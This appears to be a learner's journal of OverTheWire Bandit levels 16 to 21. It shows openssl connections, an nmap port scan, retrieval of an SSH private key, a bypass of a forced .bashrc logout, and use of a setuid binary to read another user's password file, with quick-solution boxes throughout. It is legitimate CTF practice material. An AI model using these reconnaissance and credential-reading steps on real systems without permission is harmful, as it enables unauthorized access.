>**Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.**

This is about to be very hard, i can just tell. Letme pickthis up in an hour
Well why did i think that? this should be easy 
Well i have added / learned about a few new linux commands, one of them is openssl, which is used for cryptography. So here it is 
but it just gave this 
```bash
bandit15@bandit:~$ openssl s_client -connect localhost:30001
Connecting to 127.0.0.1
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN=SnakeOil
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN=SnakeOil
verify return:1
---
Certificate chain
 0 s:CN=SnakeOil
   i:CN=SnakeOil
   a:PKEY: RSA, 4096 (bit); sigalg: sha256WithRSAEncryption
   v:NotBefore: Jun 10 03:59:50 2024 GMT; NotAfter: Jun  8 03:59:50 2034 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
MIIFBzCCAu+gAwIBAgIUBLz7DBxA0IfojaL/WaJzE6Sbz7cwDQYJKoZIhvcNAQEL
BQAwEzERMA8GA1UEAwwIU25ha2VPaWwwHhcNMjQwNjEwMDM1OTUwWhcNMzQwNjA4
MDM1OTUwWjATMREwDwYDVQQDDAhTbmFrZU9pbDCCAiIwDQYJKoZIhvcNAQEBBQAD
ggIPADCCAgoCggIBANI+P5QXm9Bj21FIPsQqbqZRb5XmSZZJYaam7EIJ16Fxedf+
jXAv4d/FVqiEM4BuSNsNMeBMx2Gq0lAfN33h+RMTjRoMb8yBsZsC063MLfXCk4p+
09gtGP7BS6Iy5XdmfY/fPHvA3JDEScdlDDmd6Lsbdwhv93Q8M6POVO9sv4HuS4t/
jEjr+NhE+Bjr/wDbyg7GL71BP1WPZpQnRE4OzoSrt5+bZVLvODWUFwinB0fLaGRk
GmI0r5EUOUd7HpYyoIQbiNlePGfPpHRKnmdXTTEZEoxeWWAaM1VhPGqfrB/Pnca+
vAJX7iBOb3kHinmfVOScsG/YAUR94wSELeY+UlEWJaELVUntrJ5HeRDiTChiVQ++
wnnjNbepaW6shopybUF3XXfhIb4NvwLWpvoKFXVtcVjlOujF0snVvpE+MRT0wacy
tHtjZs7Ao7GYxDz6H8AdBLKJW67uQon37a4MI260ADFMS+2vEAbNSFP+f6ii5mrB
18cY64ZaF6oU8bjGK7BArDx56bRc3WFyuBIGWAFHEuB948BcshXY7baf5jjzPmgz
mq1zdRthQB31MOM2ii6vuTkheAvKfFf+llH4M9SnES4NSF2hj9NnHga9V08wfhYc
x0W6qu+S8HUdVF+V23yTvUNgz4Q+UoGs4sHSDEsIBFqNvInnpUmtNgcR2L5PAgMB
AAGjUzBRMB0GA1UdDgQWBBTPo8kfze4P9EgxNuyk7+xDGFtAYzAfBgNVHSMEGDAW
gBTPo8kfze4P9EgxNuyk7+xDGFtAYzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3
DQEBCwUAA4ICAQAKHomtmcGqyiLnhziLe97Mq2+Sul5QgYVwfx/KYOXxv2T8ZmcR
Ae9XFhZT4jsAOUDK1OXx9aZgDGJHJLNEVTe9zWv1ONFfNxEBxQgP7hhmDBWdtj6d
taqEW/Jp06X+08BtnYK9NZsvDg2YRcvOHConeMjwvEL7tQK0m+GVyQfLYg6jnrhx
egH+abucTKxabFcWSE+Vk0uJYMqcbXvB4WNKz9vj4V5Hn7/DN4xIjFko+nREw6Oa
/AUFjNnO/FPjap+d68H1LdzMH3PSs+yjGid+6Zx9FCnt9qZydW13Miqg3nDnODXw
+Z682mQFjVlGPCA5ZOQbyMKY4tNazG2n8qy2famQT3+jF8Lb6a4NGbnpeWnLMkIu
jWLWIkA9MlbdNXuajiPNVyYIK9gdoBzbfaKwoOfSsLxEqlf8rio1GGcEV5Hlz5S2
txwI0xdW9MWeGWoiLbZSbRJH4TIBFFtoBG0LoEJi0C+UPwS8CDngJB4TyrZqEld3
rH87W+Et1t/Nepoc/Eoaux9PFp5VPXP+qwQGmhir/hv7OsgBhrkYuhkjxZ8+1uk7
tUWC/XM0mpLoxsq6vVl3AJaJe1ivdA9xLytsuG4iv02Juc593HXYR8yOpow0Eq2T
U5EyeuFg5RXYwAPi7ykw1PW7zAPL4MlonEVz+QXOSx6eyhimp1VZC11SCg==
-----END CERTIFICATE-----
subject=CN=SnakeOil
issuer=CN=SnakeOil
---
No client certificate CA names sent
Peer signing digest: SHA256
Peer signature type: rsa_pss_rsae_sha256
Negotiated TLS1.3 group: X25519MLKEM768
---
SSL handshake has read 3191 bytes and written 1613 bytes
Verification error: self-signed certificate
---
New, TLSv1.3, Cipher is TLS_AES_256_GCM_SHA384
Protocol: TLSv1.3
Server public key is 4096 bit
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 18 (self-signed certificate)
---
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: 634AD1BF45ADBF37DAE81A9E86E4AF4A2AA42BD00E23313EBC49DFBB6C6888FE
    Session-ID-ctx: 
    Resumption PSK: 1C98C416D58CFEC1E7A6E139BC90E918A013DF67CA3A5DF2692DF9D7BDEDFCEB2B892BB27E942420B1185131456504DC
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 46 03 cc 60 f0 94 d8 7b-1c d0 33 0c d4 b5 83 9e   F..`...{..3.....
    0010 - 03 a5 e7 b8 1d ef 73 33-65 d7 f9 71 00 26 ab db   ......s3e..q.&..
    0020 - b3 60 a3 8d 1b 4b 01 1a-10 26 bd 61 7d d6 03 73   .`...K...&.a}..s
    0030 - 60 ac f0 02 8a 7f 72 32-86 95 0f 28 9f 9c 54 38   `.....r2...(..T8
    0040 - f6 49 0d 2a df 40 d7 38-56 6a 40 47 e9 bd a2 71   .I.*.@.8Vj@G...q
    0050 - b9 4a ed 6a fb 68 c5 f5-7b 5c f3 40 ca a5 ee 92   .J.j.h..{\.@....
    0060 - fc c6 66 45 0f 76 27 20-f0 e6 b8 18 7b 9b 9b d8   ..fE.v' ....{...
    0070 - 77 37 1a 30 a1 f4 49 07-43 62 6e 82 05 62 8b 6e   w7.0..I.Cbn..b.n
    0080 - 17 78 b0 4b e3 e1 5c ab-0d 0b 1a d2 e2 84 2c df   .x.K..\.......,.
    0090 - 0a aa ed 78 a7 eb 38 52-e6 d9 63 56 04 fb 8d cc   ...x..8R..cV....
    00a0 - 67 7b 2a 46 a1 ed 42 c6-04 a5 cb fc 82 b8 4d 26   g{*F..B.......M&
    00b0 - 6b b3 5a fb 38 53 97 ec-9b 80 cd 1e c7 98 80 f7   k.Z.8S..........
    00c0 - 2a 46 a1 60 c5 6d 6e bf-f9 4b 83 eb d8 12 61 70   *F.`.mn..K....ap
    00d0 - 94 63 af c4 df 91 79 2c-42 de 59 d3 c4 7a c8 56   .c....y,B.Y..z.V

    Start Time: 1792253622
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
---
Post-Handshake New Session Ticket arrived:
SSL-Session:
    Protocol  : TLSv1.3
    Cipher    : TLS_AES_256_GCM_SHA384
    Session-ID: D320CD792F99B52B2CE9040AA9CD2E59CF51C09227E949FBE20927561698A29C
    Session-ID-ctx: 
    Resumption PSK: 412A8596139CBBBD6B6813E8191F705A3D1C5289A627B7F0A823A141AE6891192EFBB7AF4FE321234F9D47A5A57C0CA9
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    TLS session ticket lifetime hint: 300 (seconds)
    TLS session ticket:
    0000 - 46 03 cc 60 f0 94 d8 7b-1c d0 33 0c d4 b5 83 9e   F..`...{..3.....
    0010 - 30 e9 57 ae 89 dc de 3c-90 b9 64 a1 5b 80 c2 88   0.W....<..d.[...
    0020 - 8d 55 60 e1 99 06 35 57-f5 e4 ce ed 34 1e 7a 12   .U`...5W....4.z.
    0030 - 20 59 40 57 7f bc bf f3-1d 28 99 f1 5e 9a 67 bd    Y@W.....(..^.g.
    0040 - 40 52 f3 0a 47 af df b3-e5 2d fa 53 e4 3f 30 9c   @R..G....-.S.?0.
    0050 - 18 39 fc 90 1b 3f c9 ff-de 8a bd f7 04 39 82 9c   .9...?.......9..
    0060 - 74 ff 9a ed 2d e0 57 85-b1 5a 60 62 c6 3d b2 74   t...-.W..Z`b.=.t
    0070 - 93 e7 76 c8 23 62 84 fc-25 6f 45 59 56 09 b2 87   ..v.#b..%oEYV...
    0080 - 1f 03 a6 b4 4c 66 ce 65-3f c9 40 f1 96 9e f4 94   ....Lf.e?.@.....
    0090 - 07 ca db 37 d1 0b 46 8f-13 36 43 5d a6 7f 00 b7   ...7..F..6C]....
    00a0 - f9 f7 11 4c 98 a5 63 8a-bc ff 61 97 a5 80 41 11   ...L..c...a...A.
    00b0 - b3 71 ba 07 41 2a 30 3e-c9 05 fb a9 e6 3f ab 0c   .q..A*0>.....?..
    00c0 - 47 84 50 8b 86 d0 e3 a2-7d c2 e1 f4 7e 14 87 2f   G.P.....}...~../
    00d0 - 54 69 f9 41 2a 9a 7b c8-20 73 a7 e4 7f f7 eb 17   Ti.A*.{. s......

    Start Time: 1792253622
    Timeout   : 7200 (sec)
    Verify return code: 18 (self-signed certificate)
    Extended master secret: no
    Max Early Data: 0
---
read R BLOCK
old pwd here
Correct!
new pwd here 

```
so like this level is also complete ?

> [!tip] Quick Solution
> Connect with SSL/TLS and pipe in the password:
> ```bash
> echo "<bandit15_password>" | openssl s_client -quiet -connect localhost:30001
> ```
> The `-quiet` flag suppresses session details and stops it from waiting for stdin after the cert info.

---
## **Level 17**
The credentials for the next level can be retrieved by submitting the password of the current level to **a port on localhost in the range 31000 to 32000**. First find out which of these ports have a server listening on them. Then find out which of those speak SSL/TLS and which don’t. There is only 1 server that will give the next credentials, the others will simply send back to you whatever you send to it.

**Helpful note: Getting “DONE”, “RENEGOTIATING” or “KEYUPDATE”? Read the “CONNECTED COMMANDS” section in the manpage.**

This should also not take too long. Lets think this through.
We are obviously using *Piping* here, so first step of the piping should list all posrts from 31000 to 32000 thats a thousand ports. maybe this will be too huge? but apart from this, i see no way of doing it. so bruteforce it is. The second part should check which of these ports have a server listening on the, and those ports which have them should be passed to the last function which will know what is speaking ssl/TLS .
So let me check how to actually check for if a port is listening in for a server or how it communicates 
Maybe one single command can tell us all these details, and i dont have to use piping 
well we didnot need to use piping commands
i just ran a bunch of commands and one of them game me the correct port by happenstance
```shell
bandit16@bandit:~$ nmap -T4 -p 31000-32000 localhost
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-17 16:26 +0000
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.09 seconds
bandit16@bandit:~$ nmap  -p 31000-32000 localhost
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-17 16:27 +0000
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00013s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 0.10 seconds
bandit16@bandit:~$ netstat -tlpn
(No info could be read for "-p": geteuid()=11016 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
netstat: no support for `AF INET (tcp)' on this system.
tcp6       0      0 :::31960                :::*                    LISTEN      -                   
tcp6       0      0 :::31691                :::*                    LISTEN      -                   
tcp6       0      0 :::31046                :::*                    LISTEN      -                   
tcp6       0      0 :::2223                 :::*                    LISTEN      -                   
tcp6       0      0 :::2221                 :::*                    LISTEN      -                   
tcp6       0      0 :::2220                 :::*                    LISTEN      -                   
tcp6       0      0 :::2232                 :::*                    LISTEN      -                   
tcp6       0      0 :::2227                 :::*                    LISTEN      -                   
tcp6       0      0 :::2226                 :::*                    LISTEN      -                   
tcp6       0      0 :::2225                 :::*                    LISTEN      -                   
tcp6       0      0 :::2224                 :::*                    LISTEN      -                   
tcp6       0      0 :::2231                 :::*                    LISTEN      -                   
tcp6       0      0 :::2230                 :::*                    LISTEN      -                   
tcp6       0      0 :::2228                 :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
bandit16@bandit:~$ ss -tlpn
State      Recv-Q      Send-Q            Local Address:Port             Peer Address:Port      Process      
bandit16@bandit:~$ ss -tulpn
Netid     State     Recv-Q     Send-Q         Local Address:Port          Peer Address:Port     Process     
bandit16@bandit:~$ nmap -sV -p 31000-32000 localhost
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-17 16:30 +0000
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00014s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 996 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
31046/tcp open  echo
31518/tcp open  ssl/echo
31691/tcp open  echo
31790/tcp open  ssl/unknown
31960/tcp open  echo
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port31790-TCP:V=7.98%T=SSL%I=7%D=10/17%Time=6AD3A2A3%P=x86_64-pc-linux-
SF:gnu%r(GenericLines,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20c
SF:urrent\x20password\.\n")%r(GetRequest,32,"Wrong!\x20Please\x20enter\x20
SF:the\x20correct\x20current\x20password\.\n")%r(HTTPOptions,32,"Wrong!\x2
SF:0Please\x20enter\x20the\x20correct\x20current\x20password\.\n")%r(RTSPR
SF:equest,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\x20pa
SF:ssword\.\n")%r(Help,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20
SF:current\x20password\.\n")%r(FourOhFourRequest,32,"Wrong!\x20Please\x20e
SF:nter\x20the\x20correct\x20current\x20password\.\n")%r(LPDString,32,"Wro
SF:ng!\x20Please\x20enter\x20the\x20correct\x20current\x20password\.\n")%r
SF:(SIPOptions,32,"Wrong!\x20Please\x20enter\x20the\x20correct\x20current\
SF:x20password\.\n");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 123.41 seconds
bandit16@bandit:~$ 

```
So, now i am doing an open_ssl request to port **31790**
After several iteration, i came to this command
```
echo "old lvl 17 pwd here " | openssl s_client -quiet -connect localhost:31790 > /tmp/tmp.4lsT5cxw2y/privatekey_kshitish

```
It just gave me a ssh key file, am i supposed to send it for new level ? or what ? 
Let me get it into my local drive then try sending it 
Now following steps from level 15? or 14,
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ scp -P 2220 bandit16@bandit.labs.overthewire.org:/tmp/tmp.4lsT5cxw2y/privatekey_kshitish /tmp/level17privatekey
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit16@bandit.labs.overthewire.org's password: 
Permission denied, please try again.
bandit16@bandit.labs.overthewire.org's password: 
Permission denied, please try again.
bandit16@bandit.labs.overthewire.org's password: 
privatekey_kshitish                                                       100% 2612     6.2KB/s   00:00    
dibij@Dibij:~/projects/CyberSecurity-Learning$ dir /tmp
level17privatekey
mcp-PzuQsM
node-compile-cache
random_key_for_bandit
snap-private-tmp
systemd-private-59b68d1cda0e4bbd98118394a28f0442-ModemManager.service-itJKZs
systemd-private-59b68d1cda0e4bbd98118394a28f0442-bluetooth.service-G5WYCr
systemd-private-59b68d1cda0e4bbd98118394a28f0442-chrony.service-YG2EbM
systemd-private-59b68d1cda0e4bbd98118394a28f0442-colord.service-2SlYtc
systemd-private-59b68d1cda0e4bbd98118394a28f0442-fwupd.service-ICdvGf
systemd-private-59b68d1cda0e4bbd98118394a28f0442-polkit.service-KanVSc
systemd-private-59b68d1cda0e4bbd98118394a28f0442-power-profiles-daemon.service-xP2LlY
systemd-private-59b68d1cda0e4bbd98118394a28f0442-switcheroo-control.service-z2L6i9
systemd-private-59b68d1cda0e4bbd98118394a28f0442-systemd-logind.service-kBuFQd
systemd-private-59b68d1cda0e4bbd98118394a28f0442-upower.service-xWIpPp
unleash-repo-schema-v1-codeium-language-server.json
vscode-ah-be523e38b7f6

```
I have downloaded the private key into my local drive, now to change its mod, first the symlink issue was fixed by me saving it in /tmp now to change ist mode

```
dibij@Dibij:~/projects/CyberSecurity-Learning$ chmod 600 /tmp/level17privatekey 
dibij@Dibij:~/projects/CyberSecurity-Learning$ ls -lr /tmp/
-rw------- 1 dibij dibij   2612 Oct 17 22:30 level17privatekey
```

Now to send it over ssh to next level using bandit17 username

> [!tip] Quick Solution
> 1. **Find the one SSL port in 31000–32000 that gives credentials back (not echo):**
>    ```bash
>    nmap -sV -p 31000-32000 localhost
>    # Look for the port labeled ssl/unknown — that's port 31790
>    ```
> 2. **Submit the current password over SSL — you'll receive an SSH private key:**
>    ```bash
>    echo "<bandit16_password>" | openssl s_client -quiet -connect localhost:31790 > /tmp/mykey
>    ```
> 3. **Secure and use the key:**
>    ```bash
>    chmod 600 /tmp/mykey
>    ssh -i /tmp/mykey -p 2220 bandit.labs.overthewire.org -l bandit17
>    ```

---
## **Level 18**
>There are 2 files in the homedirectory: **passwords.old and passwords.new**. The password for the next level is in **passwords.new** and is the only line that has been changed between **passwords.old and passwords.new**
>**NOTE: if you have solved this level and see ‘Byebye!’ when trying to log into bandit18, this is related to the next level, bandit19**


Well, i just looked into `man diff`
it lead me to `-y` flag. I used it, and with a small tell, it showed me where the change is in 
```bash
diff -y passwords.new passowrds.old
```
it gave this result, trying it out now.
Success!! but what's this ? 
```
dibij@Dibij:~/projects/CyberSecurity-Learning$ ssh -p 2220 bandit.labs.overthewire.org -l bandit18
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit18@bandit.labs.overthewire.org's password: 

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to the #wargames channel on
discord or IRC.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc
  restricted so that users cannot snoop on eachother. Files and directories
  with easily guessable or short names will be periodically deleted! The /tmp
  directory is regularly wiped.
  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few useful tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /opt/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us on discord or IRC.

  Enjoy your stay!

Byebye !
Connection to bandit.labs.overthewire.org closed.
dibij@Dibij:~/projects/CyberSecurity-Learning$ 

```

> [!tip] Quick Solution
> Use `diff -y` to show a side-by-side comparison. The `|` symbol marks changed lines, `<` and `>` mark lines only in one file:
> ```bash
> diff -y passwords.old passwords.new
> # The line marked with | is what changed — that's the new password
> ```

---
## **Level 19**
The password for the next level is stored in a file **readme** in the homedirectory. Unfortunately, someone has modified **.bashrc** to log you out when you log in with SSH.
huh ? what do you mean ? am i supposed to solve it ? 
Well apparently this worked: 
```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ ssh -p 2220 bandit.labs.overthewire.org -l bandit18 "cat readme"
                         _                     _ _ _   
                        | |__   __ _ _ __   __| (_) |_ 
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_ 
                        |_.__/ \__,_|_| |_|\__,_|_|\__|
                                                       

                      This is an OverTheWire game server. 
            More information on http://www.overthewire.org/wargames

backend: gibson-1
bandit18@bandit.labs.overthewire.org's password: 
<,pwd here.>
```

> [!tip] Quick Solution
> Pass a command directly to SSH — it executes before `.bashrc` runs, so the forced logout never triggers:
> ```bash
> ssh -p 2220 bandit.labs.overthewire.org -l bandit18 "cat readme"
> ```

---
## **Level 20**

>To gain access to the next level, you should use the setuid binary in the homedirectory. Execute it without arguments to find out how to use it. The password for this level can be found in the usual place (/etc/bandit_pass), after you have used the setuid binary.


I honestly dont understand what the fuck happepned here, but i will try to explain
so i first naievely tried running `setuid()` and `setuid() 1` and `setuid(1)` and other variations because the question said use the setuid binary, but there was a file name bandit20-do, so you had to use that file, then it asked you to run the `whoami` command alongside it, it said `bandit20` since the file says `bandit20` and we need `bandit20` to access pwd for new level. we run these commands:
```bash
bandit19@bandit:~$ dir
bandit20-do
bandit19@bandit:~$ ls -la
total 36
drwxr-xr-x   2 root     root      4096 Sep 26 21:53 .
drwxr-xr-x 150 root     root      4096 Sep 26 21:56 ..
-rw-r--r--   1 root     root       220 Feb 13  2026 .bash_logout
-rw-r--r--   1 root     root      3851 Sep 26 21:38 .bashrc
-rw-r--r--   1 root     root       807 Feb 13  2026 .profile
-rwsr-x---   1 bandit20 bandit19 14880 Sep 26 21:53 bandit20-do
bandit19@bandit:~$ ./bandit20-do 
Run a command as another user.
  Example: ./bandit20-do whoami
bandit19@bandit:~$ ./bandit20-do whoami
bandit20
bandit19@bandit:~$ ./bandit20-do cat /etc/bandit_pass/bandit20
<pwd here>
```
Moving on......

> [!tip] Quick Solution
> The `bandit20-do` binary has the **setuid** bit set (`-rwsr-x---`), meaning it runs as `bandit20` regardless of who executes it. Use it to `cat` the password file you'd normally need `bandit20` access to:
> ```bash
> ./bandit20-do cat /etc/bandit_pass/bandit20
> ```

---
## **Level 21**
>There is a setuid binary in the home directory that does the following: it makes a connection to localhost on the port you specify as a command-line argument. It then reads a line of text from the connection and compares it to the password in the previous level (bandit20). If the password is correct, it will transmit the password for the next level (bandit21).
> **NOTE:** Try connecting to your own network daemon to see if it works as you think

i don't understand what the note means, so i need to guess which port to specify and it does not give me any direction ?  let me arbitrarily choose 30000. It has hanged itself 
so i looked a bit, and ran into this command to check my *network daemon*

```bash
dibij@Dibij:~/projects/CyberSecurity-Learning$ sudo systemctl status NetworkManager
[sudo: authenticate] Password:         
● NetworkManager.service - Network Manager
     Loaded: loaded (/usr/lib/systemd/system/NetworkManager.service; enabled; preset: enabled)
     Active: active (running) since Sat 2026-10-17 23:36:26 +0545; 25min left
 Invocation: 0c3823b4538641889bda5e45fcb316ed
       Docs: man:NetworkManager(8)
   Main PID: 1377 (NetworkManager)
      Tasks: 4 (limit: 8602)
     Memory: 6.8M (peak: 14.1M, swap: 1.9M, swap peak: 2M)
        CPU: 4.572s
     CGroup: /system.slice/NetworkManager.service
             └─1377 /usr/sbin/NetworkManager --no-daemon

Oct 17 23:36:31 Dibij NetworkManager[1377]: <info>  [1792259491.0146] device (wlp8s0): state change: ip-con>
Oct 17 23:36:31 Dibij NetworkManager[1377]: <info>  [1792259491.0207] device (wlp8s0): state change: ip-che>
Oct 17 23:36:31 Dibij NetworkManager[1377]: <info>  [1792259491.0209] device (wlp8s0): state change: second>
Oct 17 23:36:31 Dibij NetworkManager[1377]: <info>  [1792259491.0212] manager: NetworkManager state is now >
Oct 17 23:36:31 Dibij NetworkManager[1377]: <info>  [1792259491.0217] device (wlp8s0): Activation: successf>
Oct 17 23:36:31 Dibij NetworkManager[1377]: <info>  [1792259491.8139] manager: NetworkManager state is now >
Oct 17 23:36:32 Dibij NetworkManager[1377]: <info>  [1792259492.4692] manager: startup complete
Oct 17 23:36:32 Dibij NetworkManager[1377]: <info>  [1792259492.9415] policy: set 'chudarajhome_frtmt_2' (w>
Oct 17 17:51:48 Dibij NetworkManager[1377]: <info>  [1792238808.3492] agent-manager: agent[1605f87bf606b47c>
Oct 17 17:51:54 Dibij NetworkManager[1377]: <info>  [1792238814.1591] agent-manager: agent[5dd852c5048ba75f>
dibij@Dibij:~/projects/CyberSecurity-Learning$ sudo ss -tulnp
Netid   State    Recv-Q   Send-Q                                 Local Address:Port      Peer Address:Port  Process                                                                                                     
udp     UNCONN   0        0                                         127.0.0.54:53             0.0.0.0:*      users:(("systemd-resolve",pid=504,fd=18))                                                                  
udp     UNCONN   0        0                                      127.0.0.53%lo:53             0.0.0.0:*      users:(("systemd-resolve",pid=504,fd=16))                                                                  
udp     UNCONN   0        0                                       192.168.1.77:37000          0.0.0.0:*      users:(("Socket Process",pid=5043,fd=31))                                                                  
udp     UNCONN   0        0                                          127.0.0.1:323            0.0.0.0:*      users:(("chronyd",pid=1321,fd=4))                                                                          
udp     UNCONN   0        0                                            0.0.0.0:5353           0.0.0.0:*      users:(("firefox",pid=4788,fd=205))                                                                        
udp     UNCONN   0        0                                            0.0.0.0:5353           0.0.0.0:*      users:(("avahi-daemon",pid=1223,fd=12))                                                                    
udp     UNCONN   0        0                                       192.168.1.77:38234          0.0.0.0:*      users:(("Socket Process",pid=5043,fd=33))                                                                  
udp     UNCONN   0        0                                                  *:34877                *:*      users:(("firefox",pid=4788,fd=96))                                                                         
udp     UNCONN   0        0          [2400:1a00:4b48:e8d7:abb6:2164:b215:c1b0]:43204             [::]:*      users:(("Socket Process",pid=5043,fd=30))                                                                  
udp     UNCONN   0        0          [2400:1a00:4b48:e8d7:abb6:2164:b215:c1b0]:47993             [::]:*      users:(("Socket Process",pid=5043,fd=32))                                                                  
udp     UNCONN   0        0                                                  *:39864                *:*      users:(("firefox",pid=4788,fd=166))                                                                        
udp     UNCONN   0        0                                                  *:40854                *:*      users:(("firefox",pid=4788,fd=99))                                                                         
udp     UNCONN   0        0                                              [::1]:323               [::]:*      users:(("chronyd",pid=1321,fd=5))                                                                          
udp     UNCONN   0        0                                               [::]:5353              [::]:*      users:(("avahi-daemon",pid=1223,fd=13))                                                                    
tcp     LISTEN   0        4096                                      127.0.0.54:53             0.0.0.0:*      users:(("systemd-resolve",pid=504,fd=19))                                                                  
tcp     LISTEN   0        4096                                       127.0.0.1:36307          0.0.0.0:*      users:(("agy",pid=14628,fd=11))                                                                            
tcp     LISTEN   0        4096                                       127.0.0.1:40321          0.0.0.0:*      users:(("agy",pid=14628,fd=13))                                                                            
tcp     LISTEN   0        511                                        127.0.0.1:43433          0.0.0.0:*      users:(("code",pid=8156,fd=50))                                                                            
tcp     LISTEN   0        4096                                       127.0.0.1:631            0.0.0.0:*      users:(("cupsd",pid=1538,fd=7))                                                                            
tcp     LISTEN   0        4096                                   127.0.0.53%lo:53             0.0.0.0:*      users:(("systemd-resolve",pid=504,fd=17))                                                                  
tcp     LISTEN   0        4096                                           [::1]:631               [::]:*      users:(("cupsd",pid=1538,fd=6))                                                                            
dibij@Dibij:~/projects/CyberSecurity-Learning$ 

```
I tried several of these ports none worked. I don't know what the issue is.
Why cant i think for myself ? why did i have to move onto my device network daemon ? fuck me. Since a server is listentning in this ssh connection on their machine, whytf did i not think of finding the ports that are open in this machine ? why am i so dumb ? how will i improve like this ? 

```bash
bandit20@bandit:~$ nmap -p- localhost
Starting Nmap 7.98 ( https://nmap.org ) at 2026-10-17 17:37 +0000
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00011s latency).
Other addresses for localhost (not scanned): ::1
Not shown: 65505 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
1111/tcp  open  lmsocialserver
1840/tcp  open  netopia-vo2
2220/tcp  open  netiq
2221/tcp  open  rockwell-csp1
2223/tcp  open  rockwell-csp2
2224/tcp  open  efi-mg
2225/tcp  open  rcip-itu
2226/tcp  open  di-drm
2227/tcp  open  di-msg
2228/tcp  open  ehome-ms
2230/tcp  open  queueadm
2231/tcp  open  wimaxasncp
